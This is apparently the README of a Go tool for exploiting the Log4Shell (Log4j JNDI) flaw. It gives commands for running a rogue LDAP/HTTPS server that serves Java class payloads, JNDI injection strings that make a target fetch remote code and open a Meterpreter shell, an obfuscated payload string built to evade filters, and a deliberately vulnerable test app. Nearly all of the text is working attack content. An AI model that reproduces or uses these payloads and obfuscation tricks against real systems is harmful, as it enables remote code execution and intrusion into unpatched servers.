# Log4Shell
 * Check, exploit, obfuscate, TLS, ACME in one Go program. 
 * You don't need to install anything except develop it.

## Usage
 ### Common
   * ```Log4Shell.exe -host "1.1.1.1"```
   * ```Log4Shell.exe -host "example.com"```
 
 ### LDAPS and HTTPS server
   * ```Log4Shell.exe -host "example.com" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"```
   * ```Log4Shell.exe -host "1.1.1.1" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"``` (need IP SANs)
   
 ### LDAPS and HTTPS server with ACME
   * ```Log4Shell.exe -host "example.com" -auto-cert``` (must use domain name)
   
 ### Obfuscate malicious(payload) string
   ```
   Log4Shell.exe -obf "${jndi:ldap://1.1.1.1:3890/calc.class}"
   
   raw: ${jndi:ldap://1.1.1.1:3890/calc.class}
   ${${lhnK:JFL3Nl:-j}n${Yx6-A3NuXSY1nI-g38C4MN-WAFx:-d}i:${2O:bO2I5l:-l}${yeZ6-mnrv6pb:gB49n:XrYMP:-d}${jVBMSs-iOFWslRG-XuNO
   :dsCO:-a}${jYYNn:Twh80-IYXK:-p:/}${eOFbh:DW35u2:-/1.}${EkFw3Z-YsM9CIMV8:g2DHZ:-1}${Vez8Sb:Mwn:-}${yWH0V-FY9jJQZ2:TOSkrotU:
   oq1i:-}${kZ:BoJpOxRH-yFI2POt-88w2:-.1}${xbswX-VstKzXnyNzi8:jeEQKB5WRH-Ob:-}${Uyhe0-aYuAh-MdR63to:GONgfM:-.}${eA:eCPgpV-NWF
   7s:-}${mrLla-owJSvkD:n0cmdQ-V2cLx:-1:3}${CwG9:Hc:-}${xT:aiD7ho:xz:-8}90${NTSL-dSfw9NC:7OiGEp:gMQwko:-}/${TCpW:UhZI0IO8:9Jz
   5MH:WyM:-c}${Mlv:AS8TOFMM-b9I2:FqvBY:-al}${mfGW:EY1Yd48:E0KhRGfp:5CBsuC:-c}${xDw1-ZyHav9K:jPHo18i:zibmI:-.}c${ye-kZjRa5g61
   cm-Hn2yR7:-la}${Htg:cySA:-s}s}
   ```
   
## Check
 * start Log4Shell server
 * put your class file to the payload directory
 * send ```${jndi:ldap://1.1.1.1:3890/nop.class}```
 * send ```${jndi:ldaps://example.com:3890/nop.class}``` with TLS

## Exploit
 * start Log4Shell server
 * put your class file to the payload directory
 * send ```${jndi:ldap://1.1.1.1:3890/meterpreter.class}```
 * send ```${jndi:ldaps://example.com:3890/meterpreter.class}``` with TLS
 * meterpreter will open source after some time

## VulApp
 * VulApp is a vulnerable Java program that use log4j2 package.
 * You can use it for develop this project easily.
 * ```java -jar vulapp.jar ${jndi:ldap://127.0.0.1:3890/calc.class}```

## Help
  ```
  :::      ::::::::   ::::::::      :::     ::::::::  :::    ::: :::::::::: :::      :::
  :+:     :+:    :+: :+:    :+:    :+:     :+:    :+: :+:    :+: :+:        :+:      :+:
  +:+     +:+    +:+ +:+          +:+ +:+  +:+        +:+    +:+ +:+        +:+      +:+
  +#+     +#+    +:+ :#:         +#+  +:+  +#++:++#++ +#++:++#++ +#++:++#   +#+      +#+
  +#+     +#+    +#+ +#+   +#+# +#+#+#+#+#+       +#+ +#+    +#+ +#+        +#+      +#+
  #+#     #+#    #+# #+#    #+#       #+#  #+#    #+# #+#    #+# #+#        #+#      #+#
  ######## ########   ########        ###   ########  ###    ### ########## ######## ########

                                                        https://github.com/For-ACGN/Log4Shell

Usage of Log4Shell.exe:
  -auto-cert
        use ACME client to sign certificate
  -host string
        server IP address or domain name (default "127.0.0.1")
  -http-addr string
        http server address (default ":8080")
  -http-net string
        http server network (default "tcp")
  -ldap-addr string
        ldap server address (default ":3890")
  -ldap-net string
        ldap server network (default "tcp")
  -obf string
        obfuscate malicious(payload) string
  -payload string
        payload(java class) directory (default "payload")
  -tls-cert string
        tls certificate file path (default "cert.pem")
  -tls-key string
        tls private key file path (default "key.pem")
  -tls-server
        enable ldaps and https server
  ```

## Screenshot
![](https://github.com/For-ACGN/Log4Shell/raw/main/screenshot.png)
